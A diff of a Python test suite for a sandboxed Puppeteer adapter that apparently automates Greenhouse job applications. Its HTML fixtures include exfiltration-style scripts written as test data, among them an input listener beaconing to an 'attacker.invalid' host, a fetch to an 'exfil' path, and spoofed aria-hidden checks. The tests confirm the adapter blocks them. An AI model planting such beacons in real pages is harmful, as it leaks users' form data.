@@ -44,12 +44,190 @@ CLEAN_FIXTURE = b"""<!doctype html>
 </form>
 <script>window.addEventListener("input",()=>{fetch("/exfil-after-input").catch(()=>{});const image=new Image();image.src="http://attacker.invalid/leak"});</script>
 </body></html>"""
+CITIZENSHIP_STATUS_FIXTURE = b"""<!doctype html>
+<html><head><title>Citizenship Status Fixture</title></head>
+<body><form>
+<label for="first-name">First Name</label><input id="first-name" name="first_name" autocomplete="given-name" required>
+<label for="citizenship-status">Citizenship Status*</label><input id="citizenship-status" name="citizenshipStatus" required>
+<label for="usCitizen">Are you a U.S. citizen?</label><input id="usCitizen" name="usCitizen" required>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+def _field_cap_fixture(count: int) -> bytes:
+    fields = "".join(f'<label>Field {index}<input name="field_{index}"></label>' for index in range(count))
+    return f'<!doctype html><html><body><form>{fields}<button type="submit" id="submit-final">Submit Application</button></form></body></html>'.encode()
+
+
+def _button_cap_fixture(count: int) -> bytes:
+    buttons = "".join(f'<button type="button" id="offline-{index}">Continue {index}</button>' for index in range(count))
+    return f'<!doctype html><html><body>{buttons}<button type="submit" id="submit-final">Submit Application</button></body></html>'.encode()
+
+
+FIELD_CAP_BOUNDARY_FIXTURE = _field_cap_fixture(1000)
+FIELD_CAP_OVERFLOW_FIXTURE = _field_cap_fixture(1001)
+BUTTON_CAP_BOUNDARY_FIXTURE = _button_cap_fixture(399)
+BUTTON_CAP_OVERFLOW_FIXTURE = _button_cap_fixture(400)
+ARIA_HIDDEN_FIXTURE = b"""<!doctype html>
+<html><head><title>Aria Hidden Fixture</title></head>
+<body><form>
+<div aria-hidden="  TrUe  "><label>Hidden Field <input id="hidden-field" name="hidden_field" required></label></div>
+<div><section aria-hidden=" TRUE "><button type="button" id="hidden-button">Continue</button></section></div>
+<label>Visible Field <input id="visible-field" name="visible_field" required></label>
+<button type="submit" id="submit-final">Submit Application</button>
+<script>
+const hiddenField = document.getElementById("hidden-field");
+hiddenField.getAttribute = name => name === "aria-hidden"
+    ? "false" : Element.prototype.getAttribute.call(hiddenField, name);
+const hiddenSection = document.querySelector("section");
+hiddenSection.getAttribute = name => name === "aria-hidden"
+    ? "false" : Element.prototype.getAttribute.call(hiddenSection, name);
+</script></form></body></html>"""
 SUBMIT_CONTINUATION_FIXTURE = b"""<!doctype html>
 <html><head><title>Greenhouse Submit Continuation Fixture</title></head>
 <body>
 <button type="submit" id="continue-native">Continue</button>
 <button type="submit" id="submit-final">Submit Application</button>
 <script>document.getElementById("continue-native").addEventListener("click",()=>{history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");document.body.dataset.continued="yes"});</script>
+</body></html>"""
+ANCHOR_CONTINUATION_FIXTURE = b"""<!doctype html>
+<html><head><title>Greenhouse Anchor Continuation Fixture</title></head>
+<body>
+<a id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2">Next</a>
+<button type="submit" id="submit-final">Submit Application</button>
+</body></html>"""
+STATIC_ASSET_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b"</body>",
+    b'<script>if(location.search==="?gh_src=step-2")setTimeout(()=>{const image=new Image();image.src="https://job-boards.cdn.greenhouse.io/assets/continuation-pixel"},200);</script></body>',
+)
+OLD_PAGE_STATIC_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b"</body>",
+    b"""<script>
+const anchor = document.getElementById("continue-anchor");
+anchor.addEventListener("click", event => {
+  event.preventDefault();
+  history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");
+  const marker = document.createElement("button");
+  marker.type = "button";
+  marker.id = "old-page-listener-marker";
+  marker.textContent = "OLD_PAGE_LISTENER_RAN";
+  document.body.append(marker);
+  const image = new Image();
+  image.src = "https://job-boards.cdn.greenhouse.io/assets/pixel/payload-encoded-7f4c";
+});
+</script></body>""",
+)
+OLD_PAGE_WEBSOCKET_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b"</body>",
+    b"""<script>
+const anchor = document.getElementById("continue-anchor");
+anchor.addEventListener("click", event => {
+  event.preventDefault();
+  history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");
+  const marker = document.createElement("button");
+  marker.type = "button";
+  marker.id = "old-page-listener-marker";
+  marker.textContent = "OLD_PAGE_LISTENER_RAN";
+  document.body.append(marker);
+  try { new WebSocket("wss://job-boards.cdn.greenhouse.io/assets/stream"); } catch {}
+});
+</script></body>""",
+)
+ANCHOR_EMPTY_TARGET_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b' id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2"',
+    b' id="continue-anchor" target="" href="/fixture/jobs/123?gh_src=step-2"',
+)
+ANCHOR_DOWNLOAD_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b' id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2"',
+    b' id="continue-anchor" download href="/fixture/jobs/123?gh_src=step-2"',
+)
+ANCHOR_DRIFT_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b"</body>",
+    b'<script>setTimeout(()=>document.getElementById("continue-anchor").setAttribute("href","/fixture/jobs/123?gh_src=drift"),3000);</script></body>',
+)
+ANCHOR_PAGEHIDE_STATIC_URL = "https://job-boards.cdn.greenhouse.io/assets/pixel/precommit-static"
+OLD_PAGE_PAGEHIDE_STATIC_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
+    b"</body>",
+    (
+        f"""<img id="initial-static" src="{ANCHOR_PAGEHIDE_STATIC_URL}">
+<script>
+window.addEventListener("pagehide", () => {{
+  const image = new Image();
+  document.body.append(image);
+  image.loading = "eager";
+  image.src = "{ANCHOR_PAGEHIDE_STATIC_URL}";
+}});
+</script></body>"""
+    ).encode(),
+)
+NATIVE_PROGRESS_SEMANTICS_FIXTURE = b"""<!doctype html>
+<html><head><title>Native Progress Semantics Fixture</title></head>
+<body>
+<button type="button" id="continue-button">Continue</button>
+<button type="button" id="next-button">Next</button>
+<button type="button" id="next-google-button" aria-label="Continue with Google">Next</button>
+<input type="button" id="next-input" value="Next">
+<button type="button" id="continue-via-google-button">Continue via Google</button>
+<button type="button" id="continue-using-example-button">Continue using ExampleID</button>
+<button type="button" id="next-with-google-button">Next with Google</button>
+<button type="submit" id="continue-detached">Continue</button>
+<button type="button" id="apply-button">Apply</button>
+<button type="button" id="create-alert-button">Create alert</button>
+<button type="button" id="quick-apply-button">Quick Apply with MyGreenhouse</button>
+<button type="button" id="continue-with-account-button">Continue with MyGreenhouse</button>
+<button type="submit" id="apply-submit">Apply</button>
+<button type="submit" id="submit-final">Submit Application</button>
+</body></html>"""
+DISABLED_FIELDSET_FIXTURE = b"""<!doctype html>
+<html><head><title>Disabled Fieldset Fixture</title></head>
+<body>
+<fieldset disabled>
+  <button type="button" id="disabled-continue">Continue</button>
+</fieldset>
+<script>
+document.getElementById("disabled-continue").addEventListener("click", () => {
+  const marker = document.createElement("button");
+  marker.type = "button";
+  marker.id = "disabled-listener-marker";
+  marker.textContent = "Next";
+  document.body.append(marker);
+});
+</script>
+</body></html>"""
+STATIC_CAP_CONTINUATION_FIXTURE = (
+    b"<!doctype html><html><head><title>Static Cap Fixture</title>"
+    + b"".join(
+        f'<link rel="stylesheet" href="https://job-boards.cdn.greenhouse.io/assets/cap-{index}.css">'
+        .encode()
+        for index in range(200)
+    )
+    + b"""</head><body>
+<a id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2">Next</a>
+<button type="submit" id="submit-final">Submit Application</button>
+</body></html>"""
+)
+NATIVE_AUTH_BLOCKER_FIXTURE = b"""<!doctype html>
+<html><head><title>Native Auth Blocker Fixture</title></head>
+<body>
+<button type="button" id="sign-in-button">Sign in</button>
+<button type="button" id="create-account-button">Create account</button>
+<button type="button" id="log-in-button">Log in</button>
+</body></html>"""
+NATIVE_PROGRESS_DRIFT_FIXTURE = b"""<!doctype html>
+<html><head><title>Native Progress Drift Fixture</title></head>
+<body>
+<button type="button" id="drift-button">Continue</button>
+<script>
+const driftButton = document.getElementById("drift-button");
+driftButton.addEventListener("click", event => {
+  event.preventDefault();
+  const marker = document.createElement("button");
+  marker.type = "button";
+  marker.id = "drift-listener-marker";
+  marker.textContent = "DRIFT_LISTENER_RAN";
+  document.body.append(marker);
+  fetch("/exfil-drift-listener").catch(() => {});
+});
+</script>
 </body></html>"""
 CROSS_JOB_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
     b"/fixture/jobs/123?gh_src=step-2",
@@ -322,10 +500,13 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
     final_like_requests = 0
     fixture_requests = 0
     benign_requests = 0
+    static_requests = 0
     logical_urls: list[str] = []
 
     def do_GET(self):  # noqa: N802
         type(self).fixture_requests += 1
+        if self.path.startswith("/assets/"):
+            type(self).static_requests += 1
         encoded_logical = self.headers.get("x-jobs-assistant-logical-url")
         if encoded_logical:
             try:
@@ -334,6 +515,8 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
             except (ValueError, UnicodeDecodeError):
                 logical_url = ""
             type(self).logical_urls.append(logical_url)
+            if logical_url.startswith("https://job-boards.cdn.greenhouse.io/assets/"):
+                type(self).static_requests += 1
         if self.path.startswith("/redirect-cross"):
             self.send_response(302)
             self.send_header("Location", "https://boards.greenhouse.io/other/jobs/999")
@@ -395,6 +578,8 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
         type(self).benign_requests += 1
         self.send_response(200)
         self.send_header("content-type", "text/html")
+        if type(self).logical_urls and type(self).logical_urls[-1].startswith("https://job-boards.cdn.greenhouse.io/assets/"):
+            self.send_header("cache-control", "no-store")
         self.end_headers()
         logical = type(self).logical_urls[-1] if type(self).logical_urls else ""
         body = (
@@ -404,6 +589,19 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
             else SCRIPT_CROSS_ORIGIN_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-cross-origin-script")
             else SCRIPT_WEBSOCKET_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-websocket-script")
             else SCRIPT_POPUP_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-popup-script")
+            else OLD_PAGE_PAGEHIDE_STATIC_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-pagehide-static")
+            else STATIC_CAP_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-static-cap")
+            else STATIC_ASSET_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-static")
+            else OLD_PAGE_WEBSOCKET_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-old-websocket")
+            else OLD_PAGE_STATIC_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-old-static")
+            else ANCHOR_EMPTY_TARGET_FIXTURE if self.path.startswith("/continue-anchor-empty")
+            else ANCHOR_DOWNLOAD_FIXTURE if self.path.startswith("/continue-anchor-download")
+            else ANCHOR_DRIFT_FIXTURE if self.path.startswith("/continue-anchor-drift")
+            else NATIVE_AUTH_BLOCKER_FIXTURE if self.path.startswith("/continue-native-auth-blocker")
+            else NATIVE_PROGRESS_DRIFT_FIXTURE if self.path.startswith("/continue-native-progress-drift")
+            else DISABLED_FIELDSET_FIXTURE if self.path.startswith("/continue-native-disabled-fieldset")
+            else NATIVE_PROGRESS_SEMANTICS_FIXTURE if self.path.startswith("/continue-native-progress")
+            else ANCHOR_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor")
             else CROSS_JOB_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-cross-job")
             else FINAL_LIKE_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-final")
             else SUBMIT_CONTINUATION_FIXTURE if self.path.startswith("/continue-native")
@@ -424,6 +622,12 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
             else MULTI_SELECT_MASKED_FIXTURE if self.path.startswith("/multi-select-masked")
             else MULTI_SELECT_DISABLED_FIXTURE if self.path.startswith("/multi-select-disabled")
             else MULTI_SELECT_FIXTURE if self.path.startswith("/multi-select")
+            else FIELD_CAP_BOUNDARY_FIXTURE if self.path.startswith("/field-cap-boundary")
+            else FIELD_CAP_OVERFLOW_FIXTURE if self.path.startswith("/field-cap-overflow")
+            else BUTTON_CAP_BOUNDARY_FIXTURE if self.path.startswith("/button-cap-boundary")
+            else BUTTON_CAP_OVERFLOW_FIXTURE if self.path.startswith("/button-cap-overflow")
+            else ARIA_HIDDEN_FIXTURE if self.path.startswith("/aria-hidden")
+            else CITIZENSHIP_STATUS_FIXTURE if self.path.startswith("/citizenship-status")
             else CLEAN_FIXTURE if self.path.startswith("/clean") else FIXTURE.read_bytes()
         )
         self.wfile.write(body)
@@ -437,6 +641,7 @@ def fixture_server():
     FixtureHandler.final_like_requests = 0
     FixtureHandler.fixture_requests = 0
     FixtureHandler.benign_requests = 0
+    FixtureHandler.static_requests = 0
     FixtureHandler.logical_urls = []
     with socketserver.TCPServer(("127.0.0.1", 0), FixtureHandler) as server:
         thread = threading.Thread(target=server.serve_forever, daemon=True)
@@ -902,6 +1107,136 @@ def test_observe_generation_final_marker_network_denial_and_cleanup(fixture_serv
 
     with pytest.raises(ProcessLookupError):
         os.kill(launch_pid, 0)
+@BROWSER_INTEGRATION_SKIP
+def test_citizenship_status_observation_is_sensitive_and_fill_denied(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/citizenship-status")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-citizenship-status",
+        run_id=36,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        safe_field = field_by_name(observation, "first_name")
+        citizenship = field_by_name(observation, "citizenshipStatus")
+        assert "sensitive_field" not in safe_field["validity_flags"]
+        assert citizenship["label"] == "Citizenship Status*"
+        assert "Citizenship Status*" in citizenship["safety_descriptors"]
+        assert "sensitive_field" in citizenship["validity_flags"]
+        us_citizen = field_by_name(observation, "usCitizen")
+        assert us_citizen["label"] == "Are you a U.S. citizen?"
+        assert "sensitive_field" in us_citizen["validity_flags"]
+        with pytest.raises(BrowserAdapterError, match="sensitive_field"):
+            session.fill(citizenship["target_id"], "United States")
+
+@BROWSER_INTEGRATION_SKIP
+def test_observation_field_cap_accepts_global_boundary(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/field-cap-boundary")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-field-cap-boundary",
+        run_id=30,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        assert len(observation["fields"]) == 1000
+        assert not any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_observation_field_cap_overflow_fails_closed(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/field-cap-overflow")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-field-cap-overflow",
+        run_id=31,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        assert len(observation["fields"]) == 1000
+        assert any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])
+        with pytest.raises(BrowserAdapterError, match="observation_too_large"):
+            session.fill(observation["fields"][0]["target_id"], "blocked")
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_observation_button_cap_accepts_per_frame_boundary(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/button-cap-boundary")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-button-cap-boundary",
+        run_id=32,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        assert len(observation["buttons"]) == 400
+        assert not any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_observation_button_cap_overflow_fails_closed(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/button-cap-overflow")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-button-cap-overflow",
+        run_id=33,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        assert len(observation["buttons"]) == 400
+        assert any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])
+        assert observation["final_submit_target_ids"] == []
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_aria_hidden_ancestor_controls_are_observed_but_not_actionable(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/aria-hidden")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-aria-hidden-field",
+        run_id=34,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        hidden_field = field_by_name(observation, "hidden_field")
+        hidden_button = next(button for button in observation["buttons"] if button["element_id"] == "hidden-button")
+        assert hidden_field["visible"] is False
+        assert hidden_button["visible"] is False
+        assert field_by_name(observation, "visible_field")["visible"] is True
+        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
+            session.fill(hidden_field["target_id"], "blocked")
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_aria_hidden_button_is_not_actionable(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/aria-hidden")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-aria-hidden-button",
+        run_id=35,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        observation = session.observe()
+        hidden_button = next(button for button in observation["buttons"] if button["element_id"] == "hidden-button")
+        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
+            session.click_offline(hidden_button["target_id"])
+
+
+
 
 @BROWSER_INTEGRATION_SKIP
 def test_submit_typed_nonfinal_continuation_click_uses_framed_offline_protocol(fixture_server):
@@ -936,6 +1271,393 @@ def test_submit_typed_nonfinal_continuation_click_uses_framed_offline_protocol(f
 
 
 @BROWSER_INTEGRATION_SKIP
+def test_same_job_anchor_next_navigation_uses_guarded_continuation(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-continuation",
+        run_id=3,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["button_type"] == "anchor"
+            and button["target_id"] not in observation["final_submit_target_ids"]
+        )
+        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
+        result = session.click_offline(continuation["target_id"], continuation=True)
+        assert result["clicked"] is True
+        next_observation = session.observe()
+        assert next_observation["url"] == logical_url + "?gh_src=step-2"
+        assert next_observation["terminal_reason"] is None
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_continuation_allows_approved_static_after_destination_commit(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-static")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-static",
+        run_id=37,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["button_type"] == "anchor"
+            and button["target_id"] not in observation["final_submit_target_ids"]
+        )
+        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
+        assert FixtureHandler.static_requests == 0
+        before_static_requests = FixtureHandler.static_requests
+        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
+        next_observation = session.observe()
+        assert next_observation["url"] == logical_url + "?gh_src=step-2"
+        assert next_observation["terminal_reason"] is None
+        assert FixtureHandler.static_requests > before_static_requests
+        assert FixtureHandler.final_like_requests == 0
+        assert session.network_counters()["terminal_reason"] is None
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_continuation_static_cap_fails_closed(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-static-cap")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-static-cap",
+        run_id=47,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["element_id"] == "continue-anchor"
+        )
+
+        with pytest.raises(BrowserAdapterError, match="observation_too_large"):
+            session.click_offline(continuation["target_id"], continuation=True)
+
+        assert session.network_counters()["terminal_reason"] == "observation_too_large"
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_continuation_rejects_old_page_pagehide_static_before_commit(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-pagehide-static")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-pagehide-static",
+        run_id=45,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["button_type"] == "anchor"
+            and button["target_id"] not in observation["final_submit_target_ids"]
+        )
+        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
+        assert ANCHOR_PAGEHIDE_STATIC_URL in FixtureHandler.logical_urls
+        before_static_requests = FixtureHandler.static_requests
+        assert before_static_requests > 0
+        before = session.network_counters()
+        with pytest.raises(BrowserAdapterError, match="unsafe_(?:network_attempt|navigation_target)"):
+            session.click_offline(continuation["target_id"], continuation=True)
+
+        counters = session.network_counters()
+        assert counters["terminal_reason"] == "unsafe_network_attempt"
+        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"] + 1
+        assert counters["upstreamHttpAttempts"] == before["upstreamHttpAttempts"]
+        assert counters["attackerDnsLookups"] == before["attackerDnsLookups"]
+        assert FixtureHandler.static_requests == before_static_requests
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_continuation_bypasses_old_page_approved_static_listener(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-old-static")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-old-static",
+        run_id=38,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["button_type"] == "anchor"
+            and button["target_id"] not in observation["final_submit_target_ids"]
+        )
+        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
+        assert FixtureHandler.static_requests == 0
+        before_commit = session.network_counters()
+        before_commit_static_requests = FixtureHandler.static_requests
+        before_commit_attacker_requests = FixtureHandler.attacker_http_requests
+
+        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
+        destination = session.observe()
+        assert destination["url"] == logical_url + "?gh_src=step-2"
+        assert destination["terminal_reason"] is None
+        assert not any(
+            button["element_id"] == "old-page-listener-marker"
+            for button in destination["buttons"]
+        )
+
+        counters = session.network_counters()
+        assert counters["terminal_reason"] is None
+        assert counters["attackerDnsLookups"] == before_commit["attackerDnsLookups"]
+        assert counters["upstreamConnectAttempts"] == before_commit["upstreamConnectAttempts"] + 1
+        assert counters["upstreamHttpAttempts"] == before_commit["upstreamHttpAttempts"]
+        assert FixtureHandler.static_requests == before_commit_static_requests
+        assert FixtureHandler.attacker_http_requests == before_commit_attacker_requests
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_continuation_bypasses_old_page_approved_static_websocket_listener(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-old-websocket")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-old-websocket",
+        run_id=42,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["button_type"] == "anchor"
+            and button["target_id"] not in observation["final_submit_target_ids"]
+        )
+        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
+        assert FixtureHandler.static_requests == 0
+        before_commit = session.network_counters()
+        before_commit_static_requests = FixtureHandler.static_requests
+        before_commit_attacker_requests = FixtureHandler.attacker_http_requests
+
+        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
+        destination = session.observe()
+        assert destination["url"] == logical_url + "?gh_src=step-2"
+        assert destination["terminal_reason"] is None
+        assert not any(
+            button["element_id"] == "old-page-listener-marker"
+            for button in destination["buttons"]
+        )
+
+        counters = session.network_counters()
+        assert counters["terminal_reason"] is None
+        assert counters["attackerDnsLookups"] == before_commit["attackerDnsLookups"]
+        assert counters["upstreamConnectAttempts"] == before_commit["upstreamConnectAttempts"] + 1
+        assert counters["upstreamHttpAttempts"] == before_commit["upstreamHttpAttempts"]
+        assert FixtureHandler.static_requests == before_commit_static_requests
+        assert FixtureHandler.attacker_http_requests == before_commit_attacker_requests
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_empty_target_matches_no_target_and_continues(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-empty")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-empty-target",
+        run_id=39,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        continuation = next(button for button in session.observe()["buttons"] if button["button_type"] == "anchor")
+        assert continuation["target"] == ""
+        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_bare_anchor_download_is_observed_and_denied(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-download")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-download",
+        run_id=40,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        continuation = next(button for button in session.observe()["buttons"] if button["button_type"] == "anchor")
+        assert continuation["download"] is True
+        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
+            session.click_offline(continuation["target_id"], continuation=True)
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_anchor_href_snapshot_drift_fails_closed(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-anchor-drift")
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-anchor-drift",
+        run_id=41,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
+        continuation = next(button for button in session.observe()["buttons"] if button["button_type"] == "anchor")
+        time.sleep(3.2)
+        with pytest.raises(BrowserAdapterError, match="stale_generation"):
+            session.click_offline(continuation["target_id"], continuation=True)
+
+@BROWSER_INTEGRATION_SKIP
+def test_native_progress_button_drift_rejects_without_side_effects(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-native-progress-drift")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-native-progress-drift",
+        run_id=43,
+        job_id=123,
+        internal_transport_url=transport_url,
+        test_drift=True,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        drift = next(button for button in observation["buttons"] if button["element_id"] == "drift-button")
+        assert drift["button_type"] == "button"
+        before = session.network_counters()
+        before_static_requests = FixtureHandler.static_requests
+        before_attacker_requests = FixtureHandler.attacker_http_requests
+
+        assert session._arm_button_semantic_drift_for_test()["armed"] is True
+        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
+            session.click_offline(drift["target_id"], continuation=False)
+
+        after = session.observe()
+        assert after["url"] == logical_url
+        assert not any(button["element_id"] == "drift-listener-marker" for button in after["buttons"])
+        counters = session.network_counters()
+        assert counters["terminal_reason"] is None
+        for key in ("denied", "attackerDnsLookups", "upstreamConnectAttempts", "upstreamHttpAttempts"):
+            assert counters[key] == before[key]
+        assert FixtureHandler.static_requests == before_static_requests
+        assert FixtureHandler.attacker_http_requests == before_attacker_requests
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_native_progress_button_semantics_reject_non_progress_controls(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-native-progress")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-native-progress-semantics",
+        run_id=44,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+
+        for element_id in ("continue-button", "next-button", "next-input"):
+            observation = session.observe()
+            button = next(item for item in observation["buttons"] if item["element_id"] == element_id)
+            assert session.click_offline(button["target_id"], continuation=False)["clicked"] is True
+
+        observation = session.observe()
+        detached_submit = next(item for item in observation["buttons"] if item["element_id"] == "continue-detached")
+        assert detached_submit["button_type"] == "submit"
+        assert session.click_offline(detached_submit["target_id"], continuation=True)["clicked"] is True
+
+        forbidden = (
+            ("apply-button", False),
+            ("create-alert-button", False),
+            ("quick-apply-button", False),
+            ("next-google-button", False),
